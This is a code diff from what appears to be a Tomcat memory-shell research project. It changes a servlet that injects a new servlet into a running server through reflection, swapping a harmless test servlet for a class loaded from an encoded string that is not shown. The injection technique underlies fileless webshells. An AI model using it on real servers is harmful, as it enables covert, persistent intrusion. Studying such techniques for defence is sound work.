@@ -3,13 +3,17 @@ package org.su18.memshell.test.tomcat;
 import org.apache.catalina.Wrapper;
 import org.apache.catalina.core.StandardContext;
 
-import javax.servlet.*;
+import javax.servlet.Servlet;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
+
+import static org.su18.memshell.test.tomcat.DynamicUtils.SERVLET_CLASS_STRING;
 
 
 /**
@@ -49,14 +53,14 @@ public class AddTomcatServlet extends HttpServlet {
 				}
 
 				// 创建自定义 Servlet
-				Servlet servlet = new TestServlet();
+				Class<?> servletClass = DynamicUtils.getClass(SERVLET_CLASS_STRING);
 
 				// 使用 Wrapper 封装 Servlet
 				Wrapper wrapper = o.createWrapper();
 				wrapper.setName(servletName);
 				wrapper.setLoadOnStartup(1);
-				wrapper.setServlet(servlet);
-				wrapper.setServletClass(servlet.getClass().getName());
+				wrapper.setServlet((Servlet) servletClass.newInstance());
+				wrapper.setServletClass(servletClass.getName());
 
 				// 向 children 中添加 wrapper
 				o.addChild(wrapper);
@@ -70,34 +74,6 @@ public class AddTomcatServlet extends HttpServlet {
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
-		}
-	}
-
-	public static class TestServlet implements Servlet {
-
-		@Override
-		public void init(ServletConfig servletConfig) throws ServletException {
-
-		}
-
-		@Override
-		public ServletConfig getServletConfig() {
-			return null;
-		}
-
-		@Override
-		public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-			servletResponse.getWriter().println("su18");
-		}
-
-		@Override
-		public String getServletInfo() {
-			return null;
-		}
-
-		@Override
-		public void destroy() {
-
 		}
 	}
 }
